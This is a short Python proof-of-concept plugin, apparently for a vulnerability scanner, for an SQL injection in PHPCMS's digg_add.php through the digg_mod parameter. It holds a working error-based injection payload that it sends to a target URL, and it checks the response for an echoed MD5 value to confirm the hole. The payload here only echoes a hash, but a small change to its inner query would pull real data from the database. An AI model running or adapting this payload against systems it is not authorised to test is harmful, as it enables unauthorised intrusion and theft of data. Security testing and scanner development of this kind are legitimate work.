# Author:w8ay
# Name:测试DEMO
'''
name: phpcms digg_add.php SQL注入
referer: http://www.shangxueba.com/jingyan/2195152.html
author: Lucifer
description: 文件digg_add.php中,参数digg_mod存在SQL注入。
'''
import HackRequests
import re

def poc(arg, **kwargs):
    payload = "/digg/digg_add.php?id=1&con=2&digg_mod=digg_data%20WHERE%201=2%20+and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,md5(1234),0x7e)))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23"
    vulnurl = arg + payload
    hack = HackRequests.hackRequests()
    hh = hack.http(vulnurl)
    if hh.status_code != 200:
        return False
    if "81dc9bdb52d04dc20036dbd8313ed055" in hh.text():
        result = {
            "name": "PHPCMS digg_add sql_inject",  # 插件名称
            "content": "存在PHPCMS digg_add.php SQL注入漏洞",  # 插件返回内容详情，会造成什么后果。
            "url": vulnurl,  # 漏洞存在url
            "log": hh.log,
            "tag": "sql_inject"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
    pass